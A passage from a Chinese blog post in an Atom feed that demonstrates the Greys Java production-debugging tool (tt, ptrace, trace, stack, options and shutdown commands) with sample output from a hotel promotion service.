PARAMETERS[0] | 242996952                                                                                                                                              |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[1] | [CouponBase[id=1,amount=5]                                                                                |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[2] | VoucherSendTask[appName=catalysis,batchSeriesNum=catalysis-train_give_zhoubian-HOURROOM_NEWUSER-HOURROOM,transactionId=catalysis24299695225174650HOURR] |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      RETURN-OBJ | InventoryRecord[activityId=31,transactionId=catalysis24299695225174650HOURROOM242996952]                                                                |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           STACK | thread_name=&quot;http-8080-179&quot; thread_id=0x505;is_daemon=true;priority=5;                                                                                 |</span><br><span class="line">|                 |     @com.qunar.hotel.qta.open.promotion.service.impl.Bean.doSend(Bean.java:179)                                    |</span><br><span class="line">|                 |         at com.qunar.hotel.qta.open.promotion.service.impl.Bean.sendVoucherThenGetCouponId(Bean.java:191)          |</span><br><span class="line">|                 |         at com.qunar.hotel.qta.open.promotion.provider.controller.benefit.UserBenefitController.voucherSendThenGetCouponId(UserBenefitController.java: |</span><br><span class="line">|                 | 841)                                                                                                                                                   |</span><br><span class="line">|                 |         at sun.reflect.GeneratedMethodAccessor1923.invoke(null:-1)                                                                                     |</span><br><span class="line">|                 |         at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)                                                       |</span><br><span class="line">|                 |         at java.lang.reflect.Method.invoke(Method.java:606)                                                                                            |</span><br><span class="line">|                 |         at org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:214)                                       |</span><br><span class="line">|                 |         at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:132)                             |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:748 |</span><br><span class="line">|                 | )                                                                                                                                                      |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:689)    |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83)                        |</span><br><span class="line">|                 |         at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:945)                                                    |</span><br><span class="line">|                 |         at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:876)                                                     |</span><br><span class="line">|                 |         at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:931)                                                  |</span><br><span class="line">|                 |         at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:833)                                                          |</span><br><span class="line">|                 |         at javax.servlet.http.HttpServlet.service(HttpServlet.java:637)                                                                                |</span><br><span class="line">|                 |         at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:807)                                                         |</span><br><span class="line">|                 |         at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)                                                                                |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:140)                                                               |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at com.qunar.hotel.qta.base.trace.HttpTraceFilter.doFilter(HttpTraceFilter.java:44)                                                            |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at qunar.ServletWatcher.doFilter(ServletWatcher.java:118)                                                                                      |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)                                    |</span><br><span class="line">|                 |         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:108)                                                 |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)                                                         |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)                                                         |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)                                                               |</span><br><span class="line">|                 |         at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)                                                               |</span><br><span class="line">|                 |         at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:555)                                                                   |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)                                                           |</span><br><span class="line">|                 |         at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)                                                                 |</span><br><span class="line">|                 |         at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:857)                                                                  |</span><br><span class="line">|                 |         at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)                                            |</span><br><span class="line">|                 |         at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)                                                                     |</span><br><span class="line">|                 |         at java.lang.Thread.run(Thread.java:744)                                                                                                       |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>除了使用<code>ptrace</code>保存时间片段，也可以使用<code>tt</code>，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;tt -t  -n 1 com.qunar.hotel.qta.open.promotion.service.impl.Bean doSend</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 110 ms.</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1003 |       1004 |  2017-11-12 17:37:27 |         10 |     true |    false |      0x55e9f734 |         Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br></pre></td></tr></table></figure><p><em>同样的最好指定-n，避免高并发下造成太大影响</em></p><p>解决方法重载</p><p>tt -t *Test print params[0].length==1</p><p>通过制定参数个数的形式解决不同的方法签名，如果参数个数一样，你还可以这样写</p><p>tt -t *Test print ‘params[1].class == Integer.class’</p><p>解决指定参数</p><p>tt -t *Test print params[0].mobile==”13989838402”</p><p>具体的可以参见参考文档里的说明。</p><ul><li><code>tt</code>的另外一个便利之处是可以对保存的时间片主动发起一次调用</li></ul><p>和dubbo的泛化调用一样，<code>tt</code>的这个方法也可以大大降低沟通的成本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;ptrace -t  -n 1  *com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener onMessage </span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:2) cost in 126 ms.</span><br><span class="line">`---+pTracing for : thread_name=&quot;anon-com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.&lt;clinit&gt;:33-thread-2&quot; thread_id=0x205;is_daemon=true;priority=5;process=1005;</span><br><span class="line">    `---[1,1ms]com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener:onMessage(); index=1004;</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1004 |       1005 |  2017-11-12 17:43:15 |          2 |     true |    false |      0x14b7937c | BookingPromotionRollBackListen |                      onMessage |</span><br><span class="line">|          |            |                      |            |          |          |                 |                             er |                                |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line"></span><br><span class="line">ga?&gt;tt -i 1004 -p</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           INDEX | 1004                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      PROCESS-ID | 1005                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      GMT-CREATE | 2017-11-12 17:43:15                                                                                                                                    |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|        COST(ms) | 1                                                                                                                                                      |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          OBJECT | 0x14b7937c                                                                                                                                             |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           CLASS | com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener                                                                      |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          METHOD | onMessage                                                                                                                                              |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|       IS-RETURN | true                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|    IS-EXCEPTION | false                                                                                                                                                  |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[0] | &#123;&quot;messageId&quot;:&quot;171112.174315.192.168.50.191.31779.22906&quot;&#125;                                                                                               |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      RETURN-OBJ |                                                                                                                                                        |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           STACK | thread_name=&quot;anon-com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.&lt;clinit&gt;:33-thread-2&quot; thread_id=0x205;is_daemon=tr |</span><br><span class="line">|                 | ue;priority=5;                                                                                                                                         |</span><br><span class="line">|                 |     @com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.onMessage(BookingPromotionRollBackListener.java:45)             |</span><br><span class="line">|                 |         at qunar.tc.qmq.consumer.handler.ConsumerMessage.process(ConsumerMessage.java:105)                                                             |</span><br><span class="line">|                 |         at qunar.tc.qmq.consumer.handler.MessageHandler$1.run(MessageHandler.java:57)                                                                  |</span><br><span class="line">|                 |         at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)                                                                     |</span><br><span class="line">|                 |         at java.util.concurrent.FutureTask.run(FutureTask.java:262)                                                                                    |</span><br><span class="line">|                 |         at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)                                                             |</span><br><span class="line">|                 |         at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)                                                             |</span><br><span class="line">|                 |         at java.lang.Thread.run(Thread.java:744)                                                                                                       |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">Time fragment[1004] successfully replayed.</span><br></pre></td></tr></table></figure><h4 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h4><p>显示指定方法调用的栈，带时间消耗。简单的可以看下调用链上的耗时，进一步的话就需要更加专业的<code>JProfiler</code>等工具了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;trace -n 1 com.qunar.hotel.qta.open.promotion.service.impl.Bean doSend</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 102 ms.</span><br><span class="line">`---+Tracing for : thread_name=&quot;http-8080-181&quot; thread_id=0x507;is_daemon=true;priority=5;</span><br><span class="line">    `---+[13,13ms]com.qunar.hotel.qta.open.promotion.service.impl.Bean:doSend()</span><br><span class="line">        +---[0,0ms]com.qunar.hotel.qta.coupon.api.bean.CouponUser:&lt;init&gt;(@175)</span><br><span class="line">        +---[0,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getVoucherTypeId(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:&lt;init&gt;(@176)</span><br><span class="line">        +---[0,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getTransactionId(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:append(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:append(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:toString(@176)</span><br><span class="line">        +---[12,12ms]com.qunar.hotel.qta.coupon.api.remote.ActivityWriteRemote:consume(@176)</span><br><span class="line">        +---[12,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getAppName(@177)</span><br><span class="line">        +---[12,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getBatchSeriesNum(@177)</span><br><span class="line">        +---[12,0ms]java.lang.Long:valueOf(@177)</span><br><span class="line">        +---[12,0ms]java.util.List:size(@177)</span><br><span class="line">        +---[13,0ms]java.lang.Integer:valueOf(@177)</span><br><span class="line">        `---[13,0ms]org.slf4j.Logger:info(@177)</span><br></pre></td></tr></table></figure><p>最好也指定下<code>-n</code></p><h4 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h4><p>stack可以产品指定方法调用的stack， 支持正则， 也支持各种条件表达式，具体可以<code>help stack</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;stack -n 1  *com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener onMessage </span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 111 ms.</span><br><span class="line">thread_name=&quot;anon-com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.&lt;clinit&gt;:33-thread-6&quot; thread_id=0x20e;is_daemon=true;priority=5;</span><br><span class="line">    @com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.onMessage(BookingPromotionRollBackListener.java:-1)</span><br><span class="line">        at qunar.tc.qmq.consumer.handler.ConsumerMessage.process(ConsumerMessage.java:105)</span><br><span class="line">        at qunar.tc.qmq.consumer.handler.MessageHandler$1.run(MessageHandler.java:57)</span><br><span class="line">        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)</span><br><span class="line">        at java.util.concurrent.FutureTask.run(FutureTask.java:262)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:744)</span><br></pre></td></tr></table></figure><p><em>注意最好指定下-n参数，以免对线上系统造成较大的压力</em></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>还有一些其他的用法，比如支持使用js编写自定义的脚本， 查看jvm的信息， 查看加载的类等等。</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><blockquote><p>（1） 哪些命令会导致性能问题</p></blockquote><p>Greys的大部分命令性能开销都非常低廉，当然前提是一次性操作的类不要太多。</p><blockquote><p>（2） 是否能增强由BootstrapClassLoader所加载的类</p></blockquote><p>当然是可以的，但默认我封印了这个能力。主要是Greys自己也使用了大量BootstrapClassLoader所加载的类，如果处理不好极其容易造成故障。</p><p>你可以通过隐藏命令options激活这个功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;options unsafe true</span><br><span class="line">+--------+--------------+-------------+</span><br><span class="line">| NAME   | BEFORE-VALUE | AFTER-VALUE |</span><br><span class="line">+--------+--------------+-------------+</span><br><span class="line">| unsafe | false        | true        |</span><br><span class="line">+--------+--------------+-------------+</span><br><span class="line">Affect(row-cnt:1) cost in 2 ms.</span><br></pre></td></tr></table></figure><p>接下来你可以尝试增强系统类了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;monitor -c 5 java.lang.String substring</span><br><span class="line">Press Ctrl+D or Ctrl+X to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:2) cost in 35 ms.</span><br><span class="line">+---------------------+------------------+-----------+-------+---------+------+------+-----------+</span><br><span class="line">| timestamp           | class            | method    | total | success | fail | rt   | fail-rate |</span><br><span class="line">+---------------------+------------------+-----------+-------+---------+------+------+-----------+</span><br><span class="line">| 2015-06-16 23:44:54 | java.lang.String | substring | 30    | 30      | 0    | 0.23 | 0.00%     |</span><br><span class="line">+---------------------+------------------+-----------+-------+---------+------+------+-----------+</span><br></pre></td></tr></table></figure><p>但我话就放在这里，随意增强系统类。后果自负！</p><h3 id="greys-退出"><a href="#greys-退出" class="headerlink" title="greys 退出"></a>greys 退出</h3><p>greys的数据是保存在内存中的， 有些记录的栈桢需要清理，因此推荐使用<code>shutdown</code>方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;tt -l</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1001 |       1002 |  2017-11-12 17:30:40 |         20 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1002 |       1003 |  2017-11-12 17:30:41 |         10 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1003 |       1004 |  2017-11-12 17:37:27 |         10 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1004 |       1005 |  2017-11-12 17:43:15 |          2 |     true |    false |      0x14b7937c | BookingPromotionRollBackListen |                      onMessage |</span><br><span class="line">|          |            |                      |            |          |          |                 |                             er |                                |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br></pre></td></tr></table></figure><p>这些时间片默认是保存的，所以退出的时候需要清理下，不然对应用的gc都会有影响。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;shutdown</span><br><span class="line">Greys Server is shut down.</span><br></pre></td></tr></table></figure><p>greys 还提供了一个<code>reset</code>的命令，可以还原所有被增强过的类。</p><blockquote><p>  reset : Reset all the enhanced classes</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><p><a href="https://github.com/oldmanpushcart/greys-anatomy/wiki/greys-pdf" rel="external nofollow noopener noreferrer" target="_blank">greys pdf · oldmanpushcart/greys-anatomy Wiki</a></p></li><li><p><a href="http://www.bijishequ.com/detail/435931?p=29-55" rel="external nofollow noopener noreferrer" target="_blank">Grays Anatomy源码浅析–ClassLoader,Java,Method,DES,null,方法,INVOKING</a></p></li><li><p><a href="https://github.com/oldmanpushcart/greys-anatomy/wiki/FAQ" rel="external nofollow noopener noreferrer" target="_blank">FAQ · oldmanpushcart/greys-anatomy Wiki</a></p></li><li><p><a href="http://hongkaiwen.github.io/2017/07/22/java-%E7%BA%BF%E4%B8%8A%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7-greys-anatomy-%E5%AE%9E%E8%B7%B5%E5%88%9D%E6%8E%A2/index.html" rel="external nofollow noopener noreferrer" target="_blank">java 线上调试工具 greys-anatomy 实践初探 | Kuzan</a></p></li><li><p><a href="http://calvin1978.blogcn.com/articles/btrace1.html" rel="external nofollow noopener noreferrer" target="_blank">Btrace入门到熟练小工完全指南 | 江南白衣</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5NzMyMjAwMA==&amp;mid=2651478959&amp;idx=2&amp;sn=25bac2f47851c436f27c679e77e892ae&amp;chksm=bd2537d08a52bec6d5987b98e885d5b466569a7ba621a5e93297a5490ebd2ea75a04c7b51d47&amp;mpshare=1&amp;scene=1&amp;srcid=09056wNl5ibsbHVZNqBGAT8w#rd" rel="external nofollow noopener noreferrer" target="_blank">线上服务 CPU 100%？一键定位 so easy！</a></p></li><li><p><a href="https://github.com/CSUG/HouseMD/wiki/UserGuideCN" rel="external nofollow noopener noreferrer" target="_blank">UserGuideCN · CSUG/HouseMD Wiki</a></p></li><li><p><a href="https://github.com/superhj1987/awesome-scripts" rel="external nofollow noopener noreferrer" target="_blank">superhj1987/awesome-scripts: useful scripts for Linux op</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;greys&quot;&gt;&lt;a href=&quot;#greys&quot; class=&quot;headerlink&quot; title=&quot;greys&quot;&gt;&lt;/a&gt;greys&lt;/h2&gt;&lt;p&gt;greys的理念是将btrace常用的功能命令化，这样可以大大的节省排查问题的时间。&lt;/p&gt;
&lt;h3 id=&quot;gre
      
    
    </summary>
    
      <category term="perf" scheme="http://qsli.github.io/categories/perf/"/>
    
    
      <category term="greys" scheme="http://qsli.github.io/tags/greys/"/>
    
  </entry>
  
</feed>
